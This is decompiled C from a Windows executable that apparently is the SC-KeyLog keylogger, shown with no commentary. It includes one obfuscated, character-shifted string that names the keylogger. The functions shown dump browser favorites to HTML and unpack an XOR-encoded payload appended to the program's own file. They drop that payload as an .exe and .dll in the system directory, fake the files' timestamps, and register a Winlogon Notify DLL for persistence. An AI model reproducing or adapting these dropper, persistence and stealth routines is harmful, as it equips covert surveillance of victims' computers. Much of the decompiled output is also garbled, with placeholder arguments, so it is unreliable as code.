        *v42 = 0;
        *(int32_t *)(v40 - 16) = a2;
        v43 = v40 - 20;
        *(int32_t *)v43 = a1;
        function_40546c((int32_t)&g57, (int32_t)&g57, (int32_t)&g57);
    }
    // 0x405683
    *(int32_t *)(v43 - 4) = 1;
    // 0x405686
    return 1;
}

// Address range: 0x40568c - 0x405723
int32_t function_40568c(void) {
    // 0x40568c
    function_408520((int32_t)&g57);
    int32_t v1 = 0; // bp-28, 0x4056a0
    int32_t v2; // 0x40568c
    int32_t v3 = v2 - 28; // 0x4056a5
    *(char *)v3 = *(char *)(v2 + 11);
    function_4047b7(v1);
    int32_t * v4 = (int32_t *)(v2 - 4); // 0x4056ad
    *v4 = 0;
    int32_t v5 = function_404b28(6, v3); // 0x4056b7
    int32_t v6 = &v1; // 0x4056c2
    int32_t result = 0; // 0x4056c2
    if (v5 != 0) {
        int32_t lpFileName = *(int32_t *)(v2 + 8); // 0x4056c5
        DeleteFileA((char *)lpFileName);
        function_405863(lpFileName, (int32_t)"<HTML><p>&nbsp</p><H2>IE Favorites:</H2><table border='1' cellspacing='0' cellpadding='2' bordercolor='#000099'><tr><td><b>Folder</b></td><td><b>Item</b></td></tr>");
        int32_t v7 = *(int32_t *)(v2 - 24); // 0x4056dc
        result = function_40546c(lpFileName, v7 != 0 ? v7 : (int32_t)&g2, 1);
        char * v8 = "</table></HTML> "; // bp-60, 0x4056f3
        function_405863(lpFileName, (int32_t)"</table></HTML> ");
        v6 = (int32_t)&v8;
    }
    // 0x405703
    *v4 = -1;
    *(int32_t *)(v6 - 4) = 1;
    function_4047b7((int32_t)&g57);
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return result;
}

// Address range: 0x405723 - 0x4057a5
int32_t function_405723(char * str) {
    // 0x405723
    int32_t v1; // 0x405723
    int32_t v2 = v1 + 4; // 0x405723
    int32_t * str3 = (int32_t *)v2; // 0x405723
    int32_t str2 = *str3; // 0x405723
    int32_t len; // 0x405723
    int32_t v3; // 0x405723
    int32_t v4; // 0x405723
    if (str2 == 0) {
        // 0x405768
        len = strlen(str);
        v4 = 0;
        goto lab_0x405779;
    } else {
        int32_t len2 = strlen((char *)str2); // 0x405731
        int32_t v5 = strlen(str) + 2 + strlen((char *)*str3); // 0x40574c
        len = v5;
        v4 = len2;
        v3 = len2;
        if (_msize((int32_t *)*str3) >= v5) {
            goto lab_0x40578f;
        } else {
            goto lab_0x405779;
        }
    }
  lab_0x405779:;
    int32_t v6 = len + 2048;
    v3 = v4;
    if (v6 != 0) {
        // 0x40577d
        v3 = v4;
        if (function_40450f(v2, v6) == 0) {
            // 0x40579f
            return 14;
        }
    }
    goto lab_0x40578f;
  lab_0x40578f:
    // 0x40578f
    strcpy((char *)(*str3 + v3), str);
    // 0x40579f
    return 0;
}

// Address range: 0x4057a5 - 0x40585f
int32_t function_4057a5(int32_t a1, int32_t a2) {
    // 0x4057a5
    function_405723("<HTML><HEAD><TITLE>");
    char * v1 = (char *)a1; // 0x4057c0
    function_405723(v1);
    function_405723("</TITLE></HEAD><BODY>\r\n");
    function_405723("<br><table align='center' border='0' width='100%' cellpadding='8' cellspacing='0'>\r\n<tr><td align='center' bgcolor='#000099' valign='middle'><H1><font color='#CCCCCC'>\r\n");
    function_405723(v1);
    function_405723("</font></H1></td></tr></table><p>&nbsp;</p>\r\n");
    int32_t v2 = a2; // bp-48, 0x4057f3
    function_405723((char *)a2);
    int32_t v3 = &v2; // 0x4057ff
    int32_t v4; // 0x4057a5
    for (int32_t i = 3; i > 0; i--) {
        // 0x405800
        v4 = v3;
        v3 = v4 - 4;
        *(int32_t *)v3 = (int32_t)"<p>&nbsp;</p>";
        function_405723((char *)&g57);
    }
    int32_t * v5 = (int32_t *)(v4 - 8); // 0x405814
    *v5 = (int32_t)"=ubcmf!xjeui>(86&(!cpsefs>(1(!dfmmtqbdjoh>(1(!dfmmqbeejoh>(1(!bmjho>(dfoufs(?\v=us?=ue!bmjho>(dfoufs(?=is!bmjho>(dfoufs(!tj{f>(3(?\vEpdvnfou!tfou!cz!=b!isfg>(iuuq;00xxx/tpgu.dfousbm/ofu0lfzmph/qiq(?TD.LfzMph=0b?-\v!pggfsfe!cz!Tpgu.Dfousbm=cs?\vWjtju!TpguDfousbm!po!uif!xfc;!=b!isfg>(iuuq;00xxx/tpgu.dfousbm/ofu(?\viuuq;00xxx/tpgu.dfousbm/ofu=0b?=is!bmjho>(dfoufs(!tj{f>(3(?=0ue?=0us?=0ubcmf?=0CPEZ?=0IUNM?";
    int32_t len = strlen((char *)&g57); // 0x405815
    int32_t * v6 = (int32_t *)(v4 - 12); // 0x40581f
    *v6 = len + 2;
    int32_t v7 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g57); // 0x405820
    if (v7 == 0) {
        // 0x405858
        return 0;
    }
    if (len != 0) {
        int32_t v8 = (int32_t)"=ubcmf!xjeui>(86&(!cpsefs>(1(!dfmmtqbdjoh>(1(!dfmmqbeejoh>(1(!bmjho>(dfoufs(?\v=us?=ue!bmjho>(dfoufs(?=is!bmjho>(dfoufs(!tj{f>(3(?\vEpdvnfou!tfou!cz!=b!isfg>(iuuq;00xxx/tpgu.dfousbm/ofu0lfzmph/qiq(?TD.LfzMph=0b?-\v!pggfsfe!cz!Tpgu.Dfousbm=cs?\vWjtju!TpguDfousbm!po!uif!xfc;!=b!isfg>(iuuq;00xxx/tpgu.dfousbm/ofu(?\viuuq;00xxx/tpgu.dfousbm/ofu=0b?=is!bmjho>(dfoufs(!tj{f>(3(?=0ue?=0us?=0ubcmf?=0CPEZ?=0IUNM?" - v7; // 0x405833
        int32_t v9 = len; // 0x405837
        int32_t v10 = v7;
        *(char *)v10 = *(char *)(v8 + v10) - 1;
        v9--;
        int32_t v11 = v10 + 1; // 0x405842
        while (v9 != 0) {
            // 0x405839
            v10 = v11;
            *(char *)v10 = *(char *)(v8 + v10) - 1;
            v9--;
            v11 = v10 + 1;
        }
    }
    // 0x405844
    *(char *)(v7 + len) = 0;
    *v5 = v7;
    function_405723((char *)&g57);
    *v6 = v7;
    // 0x405858
    return _3f__3f_3_40_YAXPAX_40_Z(&g57);
}

// Address range: 0x40585f - 0x405863
int32_t function_40585f(void) {
    // 0x40585f
    int32_t v1; // 0x40585f
    return v1 + 4;
}

// Address range: 0x405863 - 0x405891
int32_t function_405863(int32_t file_path, int32_t str) {
    struct _IO_FILE * file = fopen((char *)file_path, g19); // 0x40586d
    int32_t result = (int32_t)file; // 0x405878
    if (file != NULL) {
        // 0x40587a
        fputs((char *)str, file);
        result = fclose(file);
    }
    // 0x40588d
    return result;
}

// Address range: 0x405891 - 0x4058b2
int32_t function_405891(void) {
    // 0x405891
    if ((g53 & 1) == 0) {
        // 0x40589a
        g53 |= 1;
    }
    // 0x4058a6
    return function_408584(0x4078aa);
}

// Address range: 0x4058b2 - 0x4058bb
int32_t function_4058b2(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4058b2
    int32_t result; // 0x4058b2
    *(int32_t *)result = (int32_t)&g7;
    return result;
}

// Address range: 0x4058d7 - 0x4058de
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t ??1?$_Mpunct@D@std@@MAE@XZ5(void) {
    // 0x4058d7
    int32_t v1; // 0x4058d7
    *(int32_t *)v1 = (int32_t)&g7;
    int32_t result; // 0x4058d7
    return result;
}

// Address range: 0x4058de - 0x4059b1
int32_t function_4058de(int32_t a1, int32_t a2) {
    int32_t stream = 0; // bp-8, 0x4058e3
    if (function_405dde(&stream, "rb") == 0) {
        // 0x4059ad
        return 0;
    }
    int32_t v1 = 2; // bp-32, 0x405902
    fseek((struct _IO_FILE *)stream, -56, SEEK_END);
    int32_t * data = (int32_t *)a1; // 0x40591b
    fread(data, 1, 56, (struct _IO_FILE *)stream);
    int32_t result; // 0x4058de
    int32_t v2; // 0x4058de
    if (*data == 0x113c1ab) {
        int32_t * nmemb = (int32_t *)(a1 + 8); // 0x405930
        int32_t data2 = _3f__3f_2_40_YAPAXI_40_Z(*nmemb); // 0x405933
        fseek((struct _IO_FILE *)stream, *(int32_t *)(a1 + 12), SEEK_SET);
        fread((int32_t *)data2, 1, *nmemb, (struct _IO_FILE *)stream);
        int32_t v3 = *nmemb - 1; // 0x40595a
        if (v3 > 1) {
            int32_t v4 = v3 + data2;
            char * v5 = (char *)v4; // 0x40595f
            char * v6 = (char *)(v4 - 1); // 0x405966
            char v7 = *v6 ^ *v5; // 0x405966
            *v6 = v7;
            *v6 = *v5 + v7;
            int32_t v8 = v3 - 1; // 0x40595a
            int32_t v9 = v8; // 0x40595d
            while (v8 > 1) {
                // 0x40595f
                v4 = v9 + data2;
                v5 = (char *)v4;
                v6 = (char *)(v4 - 1);
                v7 = *v6 ^ *v5;
                *v6 = v7;
                *v6 = *v5 + v7;
                v8 = v9 - 1;
                v9 = v8;
            }
        }
        int32_t v10 = 8; // 0x405990
        int32_t v11 = 0; // 0x4058de
        int32_t v12 = a2; // 0x4058de
        int32_t v13 = &v1;
        int32_t v14 = v13 - 4; // 0x405983
        *(int32_t *)v14 = v11 + data2;
        int32_t v15 = v13 - 8; // 0x405984
        *(int32_t *)v15 = *(int32_t *)v12;
        int32_t v16 = function_405cd2(v10, (int32_t)&g57); // 0x405986
        v10--;
        v11 += v16;
        v12 += 4;
        while (v10 != 0) {
            // 0x40597d
            v13 = v15;
            v14 = v13 - 4;
            *(int32_t *)v14 = v11 + data2;
            v15 = v13 - 8;
            *(int32_t *)v15 = *(int32_t *)v12;
            v16 = function_405cd2(v10, (int32_t)&g57);
            v10--;
            v11 += v16;
            v12 += 4;
        }
        int32_t * v17 = (int32_t *)(v13 - 12); // 0x405995
        *v17 = data2;
        _3f__3f_3_40_YAXPAX_40_Z(NULL);
        *v17 = 1;
        v2 = v14;
        result = 1;
    } else {
        // 0x40592b
        int32_t v18; // bp-28, 0x4058de
        v2 = &v18;
        result = 0;
    }
    // 0x4059a0
    *(int32_t *)(v2 - 4) = stream;
    fclose((struct _IO_FILE *)&g57);
    // 0x4059ad
    return result;
}

// Address range: 0x4059b1 - 0x405c08
int32_t function_4059b1(void) {
    // 0x4059b1
    function_408520((int32_t)&g57);
    int32_t v1; // bp-944, 0x4059b1
    int32_t v2; // 0x4059b1
    *(int32_t *)(v2 - 16) = (int32_t)&v1;
    int32_t v3 = v2 - 356; // 0x4059d1
    *(char *)v3 = *(char *)&g29;
    int32_t v4 = v2 - 355; // 0x4059da
    __asm_rep_stosd_memset((char *)v4, 0, 64);
    bool v5; // 0x4059b1
    int32_t v6 = (v5 ? -256 : 256) + v4; // 0x4059e2
    *(int16_t *)v6 = 0;
    *(char *)(v6 + (v5 ? -2 : 2)) = 0;
    int32_t v7 = v2 - 684; // 0x4059e7
    char * lpBuffer = (char *)v7; // 0x4059f2
    *(int32_t *)(v2 - 24) = 0;
    int32_t v8 = v2 - 20; // 0x4059f6
    int32_t * v9 = (int32_t *)v8; // 0x4059f6
    *v9 = 0;
    GetSystemDirectoryA(lpBuffer, 260);
    char * v10 = lpBuffer; // bp-980, 0x405a10
    int32_t * fileHandle = CreateFileA(lpBuffer, 0, 0, NULL, 3, 0x2000000, NULL); // 0x405a11
    int32_t * v11 = (int32_t *)(v2 - 32); // 0x405a19
    *v11 = 0;
    int32_t v12 = (int32_t)&v10; // 0x405a1f
    if (fileHandle != (int32_t *)-1) {
        int32_t lpCreationTime = v2 - 96; // 0x405a29
        if (GetFileTime(fileHandle, (struct _FILETIME *)lpCreationTime, (struct _FILETIME *)(v2 - 88), (struct _FILETIME *)(v2 - 80))) {
            // 0x405a38
            *v11 = lpCreationTime;
        }
        int32_t v13 = (int32_t)fileHandle; // bp-1000, 0x405a3e
        CloseHandle(fileHandle);
        v12 = &v13;
    }
    // 0x405a45
    *(int32_t *)(v12 - 4) = (int32_t)"rb";
    *(int32_t *)(v12 - 8) = v8;
    *(int32_t *)(v2 - 4) = 0;
    if (function_405dde(&g57, (char *)&g57) == 0) {
        int32_t v14 = v2 - 40; // 0x405a5d
        *(int32_t *)(v12 - 12) = (int32_t)&g12;
        *(int32_t *)(v12 - 16) = v14;
        *(int32_t *)v14 = 5;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    int32_t v15 = *(int32_t *)*(int32_t *)(*(int32_t *)(v2 + 12) + 20); // 0x405a78
    int32_t * v16 = (int32_t *)(v2 - 36); // 0x405a7a
    *v16 = v15;
    int32_t * v17 = (int32_t *)(v12 - 12); // 0x405a7d
    *v17 = v15;
    int32_t * v18 = (int32_t *)(v12 - 16); // 0x405a84
    *v18 = v7;
    int32_t * v19 = (int32_t *)(v12 - 20); // 0x405a8b
    *v19 = (int32_t)"%s\\%s.exe";
    int32_t * v20 = (int32_t *)(v12 - 24); // 0x405a90
    *v20 = v3;
    sprintf((char *)&g57, (char *)&g57);
    int32_t * v21 = (int32_t *)(v12 - 28); // 0x405a96
    *v21 = 0;
    int32_t * v22 = (int32_t *)(v12 - 32); // 0x405a97
    *v22 = 0;
    int32_t * v23 = (int32_t *)(v12 - 36); // 0x405a98
    *v23 = *v9;
    fseek((struct _IO_FILE *)&g57, (int32_t)&g57, (int32_t)&g57);
    int32_t * v24 = (int32_t *)(v2 + 8); // 0x405aa0
    int32_t v25 = *v24; // 0x405aa0
    int32_t * v26 = (int32_t *)(v25 + 4); // 0x405aaf
    *v17 = *v26;
    *v18 = v3;
    *v19 = *v9;
    int32_t v27 = function_405d09((int32_t)&g57, (int32_t)&g57, (int32_t)&g57); // 0x405ab6
    if (v27 == 0) {
        int32_t v28 = v2 - 44; // 0x405abf
        *v20 = (int32_t)&g12;
        *v21 = v28;
        *(int32_t *)v28 = 0x4000;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    // 0x405ad4
    *v20 = (int32_t)"ab";
    *v21 = v3;
    struct _IO_FILE * file = fopen((char *)&g57, (char *)&g57); // 0x405ae0
    if (file == NULL) {
        int32_t v29 = v2 - 52; // 0x405aed
        *v20 = (int32_t)&g12;
        *v21 = v29;
        *(int32_t *)v29 = 0x4000;
        _CxxThrowException(&g57, &g57);
        // UNREACHABLE
    }
    int32_t v30 = (int32_t)file; // 0x405ae0
    int32_t * v31 = (int32_t *)(v25 + 8); // 0x405b02
    *v20 = *v31;
    *v24 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g57);
    *v20 = 0;
    int32_t * v32 = (int32_t *)(v25 + 12); // 0x405b0f
    *v21 = *v32;
    *v22 = *v9;
    fseek((struct _IO_FILE *)&g57, (int32_t)&g57, (int32_t)&g57);
    *v23 = *v9;
    int32_t * v33 = (int32_t *)(v12 - 40); // 0x405b1d
    *v33 = *v31;
    int32_t * v34 = (int32_t *)(v12 - 44); // 0x405b20
    *v34 = 1;
    int32_t * v35 = (int32_t *)(v12 - 48); // 0x405b22
    *v35 = *v24;
    fread(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    int32_t * v36 = (int32_t *)(v12 - 52); // 0x405b2a
    *v36 = 2;
    int32_t * v37 = (int32_t *)(v12 - 56); // 0x405b2c
    *v37 = 0;
    *(int32_t *)(v12 - 60) = v30;
    fseek((struct _IO_FILE *)&g57, (int32_t)&g57, (int32_t)&g57);
    *(int32_t *)(v12 - 64) = v30;
    int32_t curr_file_offset = ftell((struct _IO_FILE *)&g57); // 0x405b34
    *(int32_t *)(v12 - 68) = v30;
    *v32 = curr_file_offset;
    *(int32_t *)(v12 - 72) = *v31;
    *(int32_t *)(v12 - 76) = 1;
    *(int32_t *)(v12 - 80) = *v24;
    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    *(int32_t *)(v12 - 84) = *v24;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *v20 = v30;
    *v21 = 56;
    *v22 = 1;
    *v23 = v25;
    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    *v33 = v30;
    fclose((struct _IO_FILE *)&g57);
    *v20 = *v11;
    *v21 = v3;
    function_4062af((int32_t)&g57, (int32_t)&g57);
    *v22 = 2;
    *v23 = 0;
    *v33 = *v9;
    fseek((struct _IO_FILE *)&g57, (int32_t)&g57, (int32_t)&g57);
    *v34 = *v9;
    int32_t curr_file_offset2 = ftell((struct _IO_FILE *)&g57); // 0x405b89
    *v22 = -56;
    *v22 = *v16;
    *v23 = v7;
    int32_t v38 = v2 - 944; // 0x405ba8
    *v33 = (int32_t)"%s\\%s.dll";
    *v34 = v38;
    sprintf((char *)&g57, (char *)&g57);
    *v35 = 0;
    *v36 = *v26;
    *v37 = *v9;
    fseek((struct _IO_FILE *)&g57, (int32_t)&g57, (int32_t)&g57);
    *v22 = curr_file_offset2 - 56 - *v31 - *v26;
    *v23 = v38;
    *v33 = *v9;
    int32_t v39 = function_405d09((int32_t)&g57, (int32_t)&g57, (int32_t)&g57); // 0x405bd6
    if (v39 != 0) {
        // 0x405bf4
        *v34 = *v11;
        *v35 = v38;
        function_4062af((int32_t)&g57, (int32_t)&g57);
        return function_405c16();
    }
    int32_t v40 = v2 - 48; // 0x405bdf
    *v34 = (int32_t)&g12;
    *v35 = v40;
    *(int32_t *)v40 = 0x8000;
    _CxxThrowException(&g57, &g57);
    // UNREACHABLE
}

// Address range: 0x405c08 - 0x405c14
int32_t function_405c08(void) {
    // 0x405c08
    int32_t v1; // 0x405c08
    *(int32_t *)(v1 - 24) = *(int32_t *)(v1 - 56);
    return 0x405c14;
}

// Address range: 0x405c16 - 0x405cd2
int32_t function_405c16(void) {
    // 0x405c16
    int32_t v1; // 0x405c16
    *(int32_t *)(v1 - 4) = -1;
    int32_t file = *(int32_t *)(v1 - 20); // 0x405c1a
    int32_t dwCreationFlags; // 0x405c16
    if (file != dwCreationFlags) {
        // 0x405c1f
        fclose((struct _IO_FILE *)file);
    }
    int32_t v2 = v1 - 356; // 0x405c28
    char * str = (char *)v2;
    if (strlen(str) == 0) {
        // 0x405cbe
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return *(int32_t *)(v1 - 24);
    }
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x405c3d
    int32_t v4 = function_4060cb(v2, *(int32_t *)*(int32_t *)(v3 + 20), 1); // 0x405c51
    if (v4 != dwCreationFlags) {
        int32_t * v5 = (int32_t *)(v1 - 24); // 0x405c5f
        *v5 = v4 | *v5 | 0x10000;
    }
    int32_t lpStartupInfo = v1 - 424; // 0x405c64
    memset((int32_t *)lpStartupInfo, dwCreationFlags, 68);
    int32_t lpProcessInformation = v1 - 72; // 0x405c74
    char * lpApplicationName = (char *)dwCreationFlags; // 0x405c7f
    struct _SECURITY_ATTRIBUTES * lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags; // 0x405c83
    if (CreateProcessA(lpApplicationName, str, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)lpStartupInfo, (struct _PROCESS_INFORMATION *)lpProcessInformation)) {
        // 0x405c97
        CloseHandle((int32_t *)*(int32_t *)lpProcessInformation);
        CloseHandle((int32_t *)*(int32_t *)(v1 - 68));
        // 0x405cbe
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return *(int32_t *)(v1 - 24);
    }
    char * v6 = (char *)(v1 - 22); // 0x405ca9
    *v6 = *v6 | 2;
    int32_t v7 = v1 - 24; // 0x405cad
    if ((*(int16_t *)v7 & 4095) == 0) {
        int32_t errorCode = GetLastError(); // 0x405cb5
        int32_t * v8 = (int32_t *)v7; // 0x405cbb
        *v8 = *v8 | errorCode;
    }
    // 0x405cbe
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return *(int32_t *)(v1 - 24);
}

// Address range: 0x405cd2 - 0x405d09
int32_t function_405cd2(int32_t a1, int32_t a2) {
    char * str2 = (char *)a2; // 0x405cd8
    int32_t v1 = a2 + 1; // 0x405cdb
    int32_t v2 = v1; // 0x405cde
    if (*str2 != 0) {
        int32_t v3 = v1;
        int32_t v4 = v3 + 1; // 0x405ce2
        v2 = v4;
        while (*(char *)v3 != 0) {
            // 0x405ce0
            v3 = v4;
            v4 = v3 + 1;
            v2 = v4;
        }
    }
    int32_t result = v2 - a2; // 0x405ce7
    int32_t str = _3f__3f_2_40_YAPAXI_40_Z(result + 1); // 0x405ced
    *(int32_t *)a1 = str;
    strcpy((char *)str, str2);
    return result;
}

// Address range: 0x405d09 - 0x405dde
int32_t function_405d09(int32_t a1, int32_t a2, int32_t a3) {
    char * file_path = (char *)a2; // 0x405d1b
    struct _IO_FILE * file = fopen(file_path, "wb"); // 0x405d1e
    char * v1 = (char *)1; // bp-1048, 0x405d27
    int32_t v2; // bp-1044, 0x405d09
    int32_t v3 = &v2; // 0x405d2c
    struct _IO_FILE * file2 = file; // 0x405d2c
    if (file == NULL) {
        // 0x405d2e
        v1 = file_path;
        int32_t v4 = GetFileAttributesA(file_path); // 0x405d32
        int32_t v5 = (int32_t)&v1; // 0x405d3a
        if ((v4 & 1) != 0) {
            int32_t v6 = a2; // bp-1056, 0x405d3d
            SetFileAttributesA(file_path, 1);
            v5 = &v6;
        }
        // 0x405d44
        v3 = v5 - 4;
        *(int32_t *)v3 = a2;
        if (!DeleteFileA((char *)&g57)) {
            // 0x405dd7
            return 0;
        }
        // 0x405d4f
        *(int32_t *)(v5 - 8) = (int32_t)"wb";
        *(int32_t *)(v5 - 12) = a2;
        file2 = fopen((char *)&g57, (char *)&g57);
        if (file2 == NULL) {
            // 0x405dd7
            return 0;
        }
    }
    int32_t v7 = (int32_t)file2;
    int32_t * v8 = (int32_t *)(v3 - 4); // 0x405d6d
    *v8 = a1;
    int32_t * v9 = (int32_t *)(v3 - 8);
    int32_t * v10 = (int32_t *)(v3 - 12);
    int32_t * v11 = (int32_t *)(v3 - 16);
    int32_t v12; // bp-1032, 0x405d09
    int32_t v13 = &v12;
    int32_t * v14 = (int32_t *)(v3 - 20);
    int32_t * v15 = (int32_t *)(v3 - 24);
    int32_t * v16 = (int32_t *)(v3 - 28);
    int32_t * v17 = (int32_t *)(v3 - 32);
    int32_t data = a3; // 0x405d72
    int32_t data2 = a3; // 0x405d72
    if (a3 > 1024) {
        *v9 = 1024;
        *v10 = 1;
        *v11 = v13;
        int32_t items_read = fread((int32_t *)data, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57); // 0x405d7d
        *v14 = v7;
        *v15 = items_read;
        *v16 = 1;
        *v17 = v13;
        fwrite((int32_t *)items_read, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
        data -= items_read;
        *v8 = a1;
        data2 = data;
        while (data > 1024) {
            // 0x405d74
            *v9 = 1024;
            *v10 = 1;
            *v11 = v13;
            items_read = fread((int32_t *)data, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
            *v14 = v7;
            *v15 = items_read;
            *v16 = 1;
            *v17 = v13;
            fwrite((int32_t *)items_read, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
            data -= items_read;
            *v8 = a1;
            data2 = data;
        }
    }
    // 0x405da2
    *v9 = data2;
    *v10 = 1;
    *v11 = v13;
    int32_t items_read2 = fread((int32_t *)data2, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57); // 0x405dad
    *v14 = v7;
    *v15 = items_read2;
    *v16 = 1;
    *v17 = v13;
    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    *(int32_t *)(v3 - 36) = v7;
    fclose((struct _IO_FILE *)&g57);
    *v8 = 38;
    *v9 = a2;
    SetFileAttributesA((char *)&g57, (int32_t)&g57);
    // 0x405dd7
    return 1;
}

// Address range: 0x405dde - 0x405e1e
int32_t function_405dde(int32_t * a1, char * mode) {
    // 0x405dde
    int32_t lpFilename; // bp-264, 0x405dde
    GetModuleFileNameA(NULL, (char *)&lpFilename, 260);
    struct _IO_FILE * file = fopen((char *)&lpFilename, mode); // 0x405e05
    *a1 = (int32_t)file;
    return file != NULL;
}

// Address range: 0x405e1e - 0x4060cb
int32_t function_405e1e(int32_t * str2, int32_t lpSubKey) {
    // 0x405e1e
    int32_t str; // bp-616, 0x405e1e
    sprintf((char *)&str, "Software\\Microsoft\\%s\\%s\\%s", "Windows NT", "CurrentVersion", "Winlogon");
    int32_t phkResult; // bp-8, 0x405e1e
    int32_t v1 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, (char *)&str, 0, 0x20006, (int32_t **)&phkResult); // 0x405e66
    if (v1 != 0) {
        // 0x4060c4
        return 0;
    }
    // 0x405e70
    int32_t phkResult2; // bp-12, 0x405e1e
    int32_t v2 = RegCreateKeyExA((int32_t *)phkResult, "Notify", 0, NULL, 0, 0x20006, NULL, (int32_t **)&phkResult2, NULL); // 0x405e88
    RegCloseKey((int32_t *)phkResult);
    if (v2 != 0) {
        // 0x4060c4
        return 0;
    }
    int32_t v3 = RegCreateKeyExA((int32_t *)phkResult2, (char *)lpSubKey, 0, NULL, 0, 0x20006, NULL, (int32_t **)&phkResult, NULL); // 0x405eab
    RegCloseKey((int32_t *)phkResult2);
    if (v3 != 0) {
        // 0x4060c4
        return 0;
    }
    // 0x405ec3
    RegSetValueExA((int32_t *)phkResult, "DllName", 0, 1, (char *)str2, strlen((char *)str2) + 1);
    int32_t lpData = 0; // bp-16, 0x405eea
    RegSetValueExA((int32_t *)phkResult, "Asynchronous", 0, 4, (char *)&lpData, 4);
    int32_t v4 = phkResult; // bp-800, 0x405f07
    RegSetValueExA((int32_t *)phkResult, "Impersonate", 0, 4, (char *)&lpData, 4);
    char * v5; // bp-164, 0x405e1e
    int32_t v6 = (int32_t)&v5; // 0x405f11
    v5 = (char *)0x6b636f4c;
    bool v7; // 0x405e1e
    int32_t v8 = v7 ? -4 : 4; // 0x405f17
    *(char *)(v8 + v6) = *(char *)(v8 + (int32_t)"Lock");
    int32_t v9 = 0; // bp-159, 0x405f21
    int32_t v10 = v8 + (int32_t)&v9; // 0x405f21
    *(int32_t *)v10 = 0;
    int32_t v11 = v10 + v8; // 0x405f22
    *(int32_t *)v11 = 0;
    *(char *)(v11 + v8) = 0;
    int16_t * v12 = (int16_t *)0x6f676f4c; // bp-146, 0x405f30
    int32_t v13 = v8 + (int32_t)&v12; // 0x405f30
    int32_t v14 = v8 + (int32_t)"Logoff"; // 0x405f30
    *(int16_t *)v13 = *(int16_t *)v14;
    int32_t v15 = v7 ? -2 : 2; // 0x405f31
    *(char *)(v13 + v15) = *(char *)(v14 + v15);
    int32_t v16 = 0; // bp-139, 0x405f3c
    int32_t v17 = v8 + (int32_t)&v16; // 0x405f3c
    *(int32_t *)v17 = 0;
    int32_t v18 = v17 + v8; // 0x405f3d
    *(int16_t *)v18 = 0;
    *(char *)(v18 + v15) = 0;
    int16_t * v19 = (int16_t *)0x6f676f4c; // bp-128, 0x405f49
    int16_t v20 = *(int16_t *)(v8 + (int32_t)"Logon"); // 0x405f4a
    *(int16_t *)(v8 + (int32_t)&v19) = v20;
    int32_t v21 = 0; // bp-122, 0x405f51
    int32_t v22 = v8 + (int32_t)&v21; // 0x405f51
    *(int32_t *)v22 = 0;
    *(int32_t *)(v22 + v8) = 0;
    char * v23 = (char *)0x74756853; // bp-110, 0x405f5c
    int32_t v24 = v8 + (int32_t)&v23; // 0x405f5c
    int32_t v25 = v8 + (int32_t)"Shutdown"; // 0x405f5c
    *(int32_t *)v24 = *(int32_t *)v25;
    *(char *)(v24 + v8) = *(char *)(v25 + v8);
    int32_t v26 = 0; // bp-101, 0x405f64
    int32_t v27 = v8 + (int32_t)&v26; // 0x405f64
    *(int32_t *)v27 = 0;
    *(char *)(v27 + v8) = 0;
    char * v28 = (char *)0x72617453; // bp-92, 0x405f6f
    int32_t v29 = v8 + (int32_t)&v28; // 0x405f6f
    int32_t v30 = v8 + (int32_t)"StartScreenSaver"; // 0x405f6f
    *(int32_t *)v29 = *(int32_t *)v30;
    int32_t v31 = v29 + v8; // 0x405f70
    int32_t v32 = v30 + v8; // 0x405f70
    *(int32_t *)v31 = *(int32_t *)v32;
    int32_t v33 = v31 + v8; // 0x405f71
    int32_t v34 = v32 + v8; // 0x405f71
    *(int32_t *)v33 = *(int32_t *)v34;
    *(char *)(v33 + v8) = *(char *)(v34 + v8);
    int32_t v35 = 0; // bp-66, 0x405f8f
    int32_t v36 = v8 + (int32_t)&v35; // 0x405f8f
    *(int32_t *)v36 = 0;
    *(int16_t *)(v36 + v8) = 0;
    char * v37 = (char *)0x706f7453; // bp-56, 0x405f9b
    int32_t v38 = v8 + (int32_t)&v37; // 0x405f9b
    int32_t v39 = v8 + (int32_t)"StopScreenSaver"; // 0x405f9b
    *(int32_t *)v38 = *(int32_t *)v39;
    int32_t v40 = v38 + v8; // 0x405f9c
    int32_t v41 = v39 + v8; // 0x405f9c
    *(int32_t *)v40 = *(int32_t *)v41;
    *(int32_t *)(v40 + v8) = *(int32_t *)(v41 + v8);
    int16_t * v42 = (int16_t *)0x6f6c6e55; // bp-38, 0x405fae
    int32_t v43 = v8 + (int32_t)&v42; // 0x405fae
    int32_t v44 = v8 + (int32_t)"Unlock"; // 0x405fae
    *(int16_t *)v43 = *(int16_t *)v44;
    *(char *)(v43 + v15) = *(char *)(v44 + v15);
    int32_t v45 = 0; // bp-31, 0x405fba
    int32_t v46 = v8 + (int32_t)&v45; // 0x405fba
    *(int32_t *)v46 = 0;
    int32_t v47 = v46 + v8; // 0x405fbb
    *(int16_t *)v47 = 0;
    *(char *)(v47 + v15) = 0;
    char * v48; // bp-356, 0x405e1e
    int32_t v49 = (int32_t)&v48; // 0x405fbf
